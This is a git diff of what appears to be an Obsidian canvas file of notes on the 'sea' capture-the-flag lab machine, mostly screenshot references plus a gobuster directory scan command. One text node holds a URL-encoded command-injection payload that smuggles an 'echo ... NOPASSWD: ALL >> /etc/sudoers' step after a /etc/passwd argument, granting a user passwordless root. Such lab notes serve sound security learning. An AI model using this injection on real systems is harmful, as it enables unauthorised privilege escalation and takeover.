@@ -54,10 +54,10 @@
 		{"id":"d6e1784b9b830b6a","type":"file","file":"sea/attachments/Pasted image 20250120165523.png","x":-20,"y":11360,"width":399,"height":135},
 		{"id":"764244e1091ef443","type":"file","file":"sea/attachments/Pasted image 20250120165556.png","x":-20,"y":11540,"width":399,"height":261},
 		{"id":"7191b8c2b92ba198","type":"file","file":"sea/attachments/Pasted image 20250120165438.png","x":-20,"y":11840,"width":399,"height":128},
-		{"id":"0331b2338bdeee39","type":"text","text":"/etc/passwd+%26%26+echo%20'amay%20ALL=(root)%20NOPASSWD:%20ALL'%20%3E%3E%20/etc/sudoers+#","x":460,"y":11611,"width":250,"height":60},
 		{"id":"db6e7fdf0a135010","type":"file","file":"sea/attachments/Pasted image 20250120161433.png","x":-20,"y":8880,"width":399,"height":104},
 		{"id":"31d463847b533e9c","type":"text","text":"└─$ gobuster dir -u http://sea.htb -x php --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_web -t 1000\n","x":898,"y":200,"width":825,"height":50},
-		{"id":"16f2fd1ec00870de","type":"file","file":"sea/attachments/Pasted image 20250120145902.png","x":478,"y":190,"width":400,"height":111}
+		{"id":"16f2fd1ec00870de","type":"file","file":"sea/attachments/Pasted image 20250120145902.png","x":478,"y":190,"width":400,"height":111},
+		{"id":"0331b2338bdeee39","type":"text","text":"/etc/passwd+%26%26+echo%20'amay%20ALL=(root)%20NOPASSWD:%20ALL'%20%3E%3E%20/etc/sudoers+#","x":480,"y":11600,"width":740,"height":109}
 	],
 	"edges":[]
 }
